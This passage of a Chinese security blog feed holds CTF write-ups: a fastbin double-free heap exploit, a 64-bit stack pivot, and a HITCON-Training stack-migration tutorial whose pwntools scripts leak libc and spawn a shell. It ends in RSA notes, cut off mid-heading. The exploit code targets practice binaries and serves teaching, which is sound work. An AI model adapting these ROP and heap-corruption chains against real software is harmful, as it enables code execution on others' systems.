class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(ptr[v1]);                                <span class="comment">// free struct</span></span><br><span class="line">  <span class="built_in">puts</span>(&amp;quot;#---------------------#&amp;quot;);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;quot;#      ALL Down!      #&amp;quot;);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;quot;#######################&amp;quot;);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在看后门函数 read_flag() ，将 flag 读入到 bss 段，并且（15行）写入 0x60 。若假设 flag 位于某一个堆的 fd 位置， 0x60 刚好位于该堆的 size 位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">read_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  stream = fopen(&amp;quot;/flag&amp;quot;, &amp;quot;r&amp;quot;);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;quot;Emmmmmm!Maybe you want Fool me!&amp;quot;);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  byte_6020A0 = <span class="number">96</span>;                             <span class="comment">// chunk size</span></span><br><span class="line">  fgets(s, <span class="number">45</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用思路：double free 让某一个堆既处于 fastbin 又是被分配状态。修改该堆 fd 指针，重新分配相同大小堆，用程序 view 函数读出。</p><p>完整 exp 如下：</p><p>最后一轮申请堆使用的是0x20 是因为修改了堆数据，申请其他大小会报错，所以就用 fastbin 中剩下的堆，gdb 查一下就看到了剩下 0x20 ，所以用 0x20 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line">p = process(&amp;quot;./excited&amp;quot;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">creat</span>(<span class="params">ba_len,ba,na_len,na</span>):</span></span><br><span class="line">    p.recvuntil(&amp;quot;want to do :&amp;quot;)</span><br><span class="line">    p.sendline(&amp;quot;<span class="number">1</span>&amp;quot;)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&amp;quot;length :&amp;quot;)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(ba_len))</span><br><span class="line">    p.recvuntil(&amp;quot;ba :&amp;quot;)</span><br><span class="line">    p.sendline(ba)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&amp;quot;length :&amp;quot;)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(na_len))</span><br><span class="line">    p.recvuntil(&amp;quot;na :&amp;quot;)</span><br><span class="line">    p.sendline(na)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    p.recvuntil(&amp;quot;want to do :&amp;quot;)</span><br><span class="line">    p.sendline(&amp;quot;<span class="number">3</span>&amp;quot;)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&amp;quot;ID :&amp;quot;)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    p.recvuntil(&amp;quot;want to do :&amp;quot;)</span><br><span class="line">    p.sendline(&amp;quot;<span class="number">4</span>&amp;quot;)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&amp;quot;ID :&amp;quot;)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">creat(<span class="number">0x50</span>,&amp;<span class="comment">#039;a&amp;#039;*0x50,0x50,&amp;#039;b&amp;#039;*0x50)//被double free chuck</span></span><br><span class="line">creat(<span class="number">0x50</span>,&amp;<span class="comment">#039;c&amp;#039;*0x50,0x50,&amp;#039;d&amp;#039;*0x50)//用于隔开double free chunk</span></span><br><span class="line">creat(<span class="number">0x50</span>,&amp;<span class="comment">#039;e&amp;#039;*0x50,0x50,&amp;#039;f&amp;#039;*0x50)//防止上面两个chunk free 与top chunk合并</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)//间隔</span><br><span class="line">delete(<span class="number">0</span>)//double free</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">creat(<span class="number">0x50</span>,p64(<span class="number">0x06020A8</span>-<span class="number">0x10</span>)*<span class="number">10</span>,<span class="number">0x50</span>,p64(<span class="number">0x06020A8</span>-<span class="number">0x10</span>)*<span class="number">10</span>)//edit chunk1 fd to flag</span><br><span class="line">creat(<span class="number">0x50</span>,&amp;<span class="comment">#039;&amp;#039;,0x50,&amp;#039;&amp;#039;)</span></span><br><span class="line">creat(<span class="number">0x50</span>,&amp;<span class="comment">#039;&amp;#039;,0x20,&amp;#039;&amp;#039;)</span></span><br><span class="line">view(<span class="number">5</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>还有点不清楚的就是：完成 double free 后申请堆的时候，使用 fastbin 的顺序很奇怪。具体点说：每轮 free fastbin 会增加 1 个 0x20 、2 个 0x60 chunk 。但是最终 free 3 轮后有 4 个 0x20 、6 个 0x60 。紧接着第一轮申请使用的是第三轮和第二轮各一个 0x60 。最后我是每申请一次就调试一次，看每次申请的是那块 chunk。</p><p>这里搞了很久，各位师傅知道的告诉一下。</p><h3 id="borrowstack"><a href="#borrowstack" class="headerlink" title="borrowstack"></a>borrowstack</h3><p>64 位栈迁移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line">p = process(&amp;quot;./borrowstack&amp;quot;)</span><br><span class="line">elf = ELF(&amp;quot;./borrowstack&amp;quot;)</span><br><span class="line">libc = ELF(&amp;quot;/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>&amp;quot;)</span><br><span class="line"></span><br><span class="line">bank = <span class="number">0x601080</span></span><br><span class="line">pop_rdi = <span class="number">0x400703</span></span><br><span class="line">leave = <span class="number">0x400699</span></span><br><span class="line">puts_plt = elf.plt[&amp;<span class="comment">#039;puts&amp;#039;]</span></span><br><span class="line">puts_got = elf.got[&amp;<span class="comment">#039;puts&amp;#039;]</span></span><br><span class="line">one_gadget = <span class="number">0xf02a4</span></span><br><span class="line"></span><br><span class="line">payload_0 = &amp;<span class="comment">#039;a&amp;#039;*0x60</span></span><br><span class="line">payload_0 += p64(bank+<span class="number">0x90</span>) + p64(leave)</span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;want&amp;#039;)</span></span><br><span class="line">p.send(payload_0)</span><br><span class="line"></span><br><span class="line">pay=&amp;<span class="comment">#039;\0&amp;#039;*0x90+p64(bank+0x60)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)</span></span><br><span class="line">pay+=p64(<span class="number">0x0400680</span>)</span><br><span class="line">p.sendafter(&amp;<span class="comment">#039;now!\n&amp;#039;,pay)</span></span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>)[:].ljust(<span class="number">8</span>,&amp;<span class="comment">#039;\0&amp;#039;))-libc.symbols[&amp;#039;puts&amp;#039;]</span></span><br><span class="line">info(&amp;quot;one:&amp;quot;+<span class="built_in">hex</span>(libc_base+one_gadget))</span><br><span class="line"></span><br><span class="line">pay=&amp;<span class="comment">#039;a&amp;#039;*0x60+p64(0xdeadbeef)+p64(one_gadget+libc_base)</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
            <tag> Writeup </tag>
            
            <tag> 新春战疫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈迁移学习（旧）</title>
      <link href="archives/f3d2f4dc/"/>
      <url>archives/f3d2f4dc/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>栈迁移可以解决栈溢出后，没有足够空间写入 payload 的情况。主要通过 伪造 ebp ，并利用 leave|ret gadget 劫持栈到预设位置。</p><blockquote><p>leave | ret == mov ebp,esp;pop ebp;ret</p></blockquote><h2 id="HITCON-Training-master-lab6"><a href="#HITCON-Training-master-lab6" class="headerlink" title="HITCON-Training-master lab6"></a><a href="https://github.com/scwuaptx/HITCON-Training">HITCON-Training-master lab6</a></h2><h3 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h3><p>程序为32 位打开 NX 防护：</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200305221400.png"></p><p>运行程序，提示输入，输入后退出程序：</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200305221521.png"></p><p>main 函数 read 存在栈溢出，可溢出长度为 0x40 - 0x28 ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-28h]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( count != <span class="number">0x539</span> )</span><br><span class="line">    exit(<span class="number">1</span>);</span><br><span class="line">  ++count;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  puts(&amp;quot;Try your best :&amp;quot;);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;amp;buf, 0x40u);//栈溢出</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在可以溢出操作的空间很小，可以考虑使用栈迁移，当然你能找到超短的 shellcode 也可以。能不能进行 ROP ，emmm 需要修改 count 防止退出程序。那就用栈迁移吧。</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a><strong>利用思路</strong></h3><p><em>我们可以利用溢出 eip 调用 read 在劫持前，写入伪造栈空间内容（执行什么命令、有什么变量、伪造栈的ebp等）</em></p><p>伪造 ebp 劫持当前栈到另外一个地方 stack 1 ；然后在 stack 1 泄露出 libc 基地址，并再次伪造 ebp 劫持当前栈到另外一个地方 stack 2；调用 system(‘/bin/sh’) 。</p><p><strong>第一步</strong></p><p>我选择将当前栈 stack 0 ，劫持到内存地址为 bss+0x200 的stack 1。为什么是 bss+0x200 ？一开始劫持到 bss 报错，然后就选择高点的地址就成功了。</p><p>我们迁移栈之后，栈总不能是空的，什么都不执行就退出了，所以在这一步需要控制 stack 0 的 eip 调用 read ，写入 stack 1 的栈数据。</p><p>大致利用思路里说了，需要第二次迁移栈，所以我们也需要伪造 stack 1 ，以实现在将 stack 1 劫持到 stack 2 。</p><p>payload 0 构造如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = &amp;<span class="comment">#039;a&amp;#039; * 0x28 #填充</span></span><br><span class="line">payload += stack_1 <span class="comment">#伪造ebp</span></span><br><span class="line">payload += read_plt <span class="comment">#调用read</span></span><br><span class="line">payload += leave_ret <span class="comment">#利用gadget将ebp赋值esp完成栈迁移</span></span><br><span class="line">payload += p32(<span class="number">0</span>)+p32(stack_1)+p32(<span class="number">0x100</span>) <span class="comment">#read传参</span></span><br></pre></td></tr></table></figure><p>注意：输入 payload 0 依然在 stack 0 ，停在 read 等待输入状态。我们输入 payload 1 后才栈迁移到 stack 1 。</p><p><strong>第二步</strong></p><p>在这一步需要泄露 libc 基地址，调用一个有输出功能的函数，把某一个函数的真实地址输出出来，然后计算 libc 的偏移。</p><p>这一步还需要进行一次栈迁移，伪造的 ebp 已经在迁移进入 stack 1 前，已经在stack 0 通过 read 写入到 stack 1 的 ebp 位置，所以只需要调用 leave|ret gadget 就可以进行栈迁移。</p><p>既然进行栈迁移，就还是需要提前写入 stack 3 的数据，就需要再次调用 read 。payload 1 先提供一个用于写入stack 2 的 read 函数入口，至于 payload 2 在第三步分析。</p><p>payload 1 构造如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(stack_2) <span class="comment">#伪造ebp</span></span><br><span class="line">payload += p32(puts_plt) <span class="comment">#调用输出函数</span></span><br><span class="line">payload += p32(pop_ret) <span class="comment">#返回</span></span><br><span class="line">payload += p32(puts_got) <span class="comment">#函数真实地址</span></span><br><span class="line">payload += p32(read_plt) </span><br><span class="line">payload += p32(leave_ret) <span class="comment">#利用gadget将ebp赋值esp完成栈迁移</span></span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(stack_2) + p32(<span class="number">0x100</span>) <span class="comment">#read传参</span></span><br></pre></td></tr></table></figure><p><strong>第三步</strong></p><p>这一步不需要再栈迁移，因此不需要再伪造 ebp ，用 0x8 数据填充占位即可。最终目的是执行 system(‘/bin/sh’) ，system 地址可以通过查询 libc 后加上偏移得到，/bin/sh 获取有多种方法。可以在 libc 查，可以再次调用 read 输入。</p><p>payload 2 构造如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(<span class="number">0x11111111</span>) <span class="comment">#ebp占位</span></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(pop_ret) <span class="comment">#返回</span></span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(stack_1) + p32(<span class="number">0x100</span>) <span class="comment">#传参，将/bin/sh存储在stack1</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += p32(<span class="number">0x22222222</span>) <span class="comment">#system压栈返回地址，垃圾填充即可</span></span><br><span class="line">payload += p32(stack_1) <span class="comment">#/bin/sh\0 地址</span></span><br></pre></td></tr></table></figure><p><strong>栈空间图</strong></p><p>用 read 从 stack esp 写入的时候，各个指令顺序与计算机写入方式有关。假如 read  0x10 数据，会从输入地址向高地址写入 0x10 空间。写入一般为小端序，简单点就是写在前面的，存在后面。输入 ABCD ，录入 0x64636261 。所以 read 中填入命令越前地址越高越先被执行</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200307000025.png"></p><p><strong>完整exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=&amp;quot;debug&amp;quot;</span><br><span class="line"> </span><br><span class="line">p = process(&amp;<span class="comment">#039;./migration&amp;#039;)</span></span><br><span class="line">lib = ELF(&amp;<span class="comment">#039;/lib/i386-linux-gnu/libc.so.6&amp;#039;)</span></span><br><span class="line">elf = ELF(&amp;<span class="comment">#039;./migration&amp;#039;)</span></span><br><span class="line"> </span><br><span class="line">read_plt = elf.symbols[&amp;<span class="comment">#039;read&amp;#039;]</span></span><br><span class="line">puts_plt = elf.symbols[&amp;<span class="comment">#039;puts&amp;#039;]</span></span><br><span class="line">puts_got = elf.got[&amp;<span class="comment">#039;puts&amp;#039;]</span></span><br><span class="line">read_got = elf.got[&amp;<span class="comment">#039;read&amp;#039;]</span></span><br><span class="line">buf = elf.bss() + <span class="number">0x500</span></span><br><span class="line">buf2 = elf.bss() + <span class="number">0x400</span></span><br><span class="line"> </span><br><span class="line">pop1ret = <span class="number">0x804836d</span></span><br><span class="line">pop3ret = <span class="number">0x8048569</span></span><br><span class="line">leave_ret = <span class="number">0x08048418</span></span><br><span class="line"> </span><br><span class="line">puts_lib = lib.symbols[&amp;<span class="comment">#039;puts&amp;#039;]</span></span><br><span class="line">system_lib = lib.symbols[&amp;<span class="comment">#039;system&amp;#039;]</span></span><br><span class="line"> </span><br><span class="line">p.recv()</span><br><span class="line"> </span><br><span class="line">log.info(&amp;quot;*********************change stack_space*********************&amp;quot;)</span><br><span class="line">junk = &amp;<span class="comment">#039;a&amp;#039;*0x28</span></span><br><span class="line">payload = junk + p32(buf) + p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(buf) + p32(<span class="number">0x100</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">log.info(&amp;quot;*********************leak libc memory address*********************&amp;quot;)</span><br><span class="line"> </span><br><span class="line">payload1 = p32(buf2) + p32(puts_plt) + p32(pop1ret) + p32(puts_got) + p32(read_plt) + p32(leave_ret)</span><br><span class="line">payload1 += p32(<span class="number">0</span>) + p32(buf2) + p32(<span class="number">0x100</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"> </span><br><span class="line">puts_add = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">lib_base = puts_add - puts_lib</span><br><span class="line"><span class="built_in">print</span> &amp;quot;libc base address--&amp;gt;[%s]&amp;quot;%<span class="built_in">hex</span>(lib_base)</span><br><span class="line">system_add = lib_base + system_lib</span><br><span class="line"><span class="built_in">print</span> &amp;quot;system address --&amp;gt;[%s]&amp;quot;%<span class="built_in">hex</span>(system_add)</span><br><span class="line"> </span><br><span class="line">log.info(&amp;quot;*********************write binsh*********************&amp;quot;)</span><br><span class="line">payload3= p32(buf) + p32(read_plt) + p32(pop3ret) + p32(<span class="number">0</span>) + p32(buf) + p32(<span class="number">0x100</span>) + p32(system_add) + &amp;<span class="comment">#039;bbbb&amp;#039; + p32(buf)</span></span><br><span class="line">p.send(payload3)</span><br><span class="line">p.send(&amp;quot;/<span class="built_in">bin</span>/sh\<span class="number">0</span>&amp;quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 栈迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA加密笔记</title>
      <link href="archives/1e3781ff/"/>
      <url>archives/1e3781ff/</url>
      
        <content type="html"><![CDATA[<h1 id="RSA加密笔记"><a href="#RSA加密笔记" class="headerlink" title="RSA加密笔记"></a>RSA加密笔记</h1><blockquote><p>最后更新：2020-03-02 11:23:12</p></blockquote><h2 id="1-RSA-介绍"><a href="#1-RSA-介绍" class="headerlink" title="1. RSA 介绍"></a>1. RSA 介绍</h2><p>RSA 算法涉及参数有：<code>n、e、d（p、q）</code>，其中分为私钥和公钥。公钥为：<code>n、e</code>，私钥为：<code>phi、d</code>。涉及数学基础有：欧拉函数（phi）、欧几里得算法（gcd）、同余。</p><p><strong>参数介绍</strong>：</p><p><strong>n</strong> ： 两个素数 p 与 q 的乘积。注意：n 将公开，而 p 与 q 不公开。</p><p><strong>e</strong> ：一个素数。满足 <code>1&lt;e&lt;phi</code> ，且 <code>gcd(phi,e)=1</code>（与 phi 最大公约数为 1 ，即互素）。</p><p><strong>phi</strong> ： 欧拉数，计算公式：<code>phi = (p-1)(q-1)</code>。</p><p><strong>d</strong> ： e 模 phi 的逆元，具体关系式：<code>d * e = 1 mod(phi)</code>。</p><h2 id="2-加解密算法"><a href="#2-加解密算法" class="headerlink" title="2. 加解密算法"></a>2. 加解密算法</h2><p>c = m^e mod n = pow(m,e,n)</p><p>m = c^d mod n = pow(c,d,n)</p><h2 id="3-基础加解密脚本"><a href="#3-基础加解密脚本" class="headerlink" title="3. 基础加解密脚本"></a>3. 基础加解密脚本</h2><p>加密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">msg = <span class="string">&#x27;flag is :testflag&#x27;</span><span class="comment"># 明文</span></span><br><span class="line">hex_msg=<span class="built_in">int</span>(msg.encode(<span class="string">&quot;hex&quot;</span>),<span class="number">16</span>)<span class="comment"># 转换明文为数字</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成公钥 n、e</span></span><br><span class="line">p=getPrime(<span class="number">100</span>)<span class="comment"># 随机生成一个质数</span></span><br><span class="line">q=getPrime(<span class="number">100</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">print(<span class="string">&quot;n=&quot;</span>,<span class="built_in">hex</span>(n))</span><br><span class="line">print(<span class="string">&quot;e=&quot;</span>,<span class="built_in">hex</span>(e))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成私钥 phi、d</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)<span class="comment"># 逆元运算</span></span><br><span class="line">print(<span class="string">&quot;phi=&quot;</span>,<span class="built_in">hex</span>(phi))</span><br><span class="line">print(<span class="string">&quot;d=&quot;</span>,<span class="built_in">hex</span>(d))</span><br><span class="line"></span><br><span class="line"><span class="comment">#加密算法</span></span><br><span class="line">c=<span class="built_in">pow</span>(hex_msg,e,n)</span><br><span class="line">print(<span class="string">&quot;c=&quot;</span>,<span class="built_in">hex</span>(c))</span><br></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 已知 c、n、e ，并分解n获得q、p</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">c=<span class="number">0x534280240c65bb1104ce3000bc8181363806e7173418d15762</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">n=<span class="number">0x80b32f2ce68da974f25310a23144977d76732fa78fa29fdcbf</span></span><br><span class="line"><span class="comment"># 这里使用yafu分解n</span></span><br><span class="line">p=<span class="number">780900790334269659443297956843</span></span><br><span class="line">q=<span class="number">1034526559407993507734818408829</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算私钥</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line"><span class="comment"># 解密算法</span></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">print(<span class="built_in">hex</span>(m)[<span class="number">2</span>:].decode(<span class="string">&#x27;hex&#x27;</span>))<span class="comment"># 转换明文为字符</span></span><br></pre></td></tr></table></figure><p>一般情况下，c e n phi p q c 都是 int 型，m 是 str 型。所以需要将 m 转换为 int 型带入算法进行异或运算。</p><p>我遇到过有两种转换方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法 1 </span></span><br><span class="line">msg=<span class="built_in">int</span>(msg.encode(<span class="string">&quot;hex&quot;</span>),<span class="number">16</span>)</span><br><span class="line">msg=<span class="built_in">hex</span>(msg)[<span class="number">2</span>:].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="comment"># 方法 2 </span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">bytes_to_long(<span class="string">b&#x27;felinae&#x27;</span>)<span class="comment"># bytes 转 int</span></span><br><span class="line">long_to_bytes(<span class="number">28821963924201829</span>)<span class="comment"># 数字转 bytes</span></span><br></pre></td></tr></table></figure><p>求逆元 d 的话，用 gmpy2.invert 代入参数即可。只是 gmpy2 这个库比较难装。</p><h2 id="4-常见攻击方法"><a href="#4-常见攻击方法" class="headerlink" title="4. 常见攻击方法"></a>4. 常见攻击方法</h2><h3 id="4-1-p-与-q-相差过大-小"><a 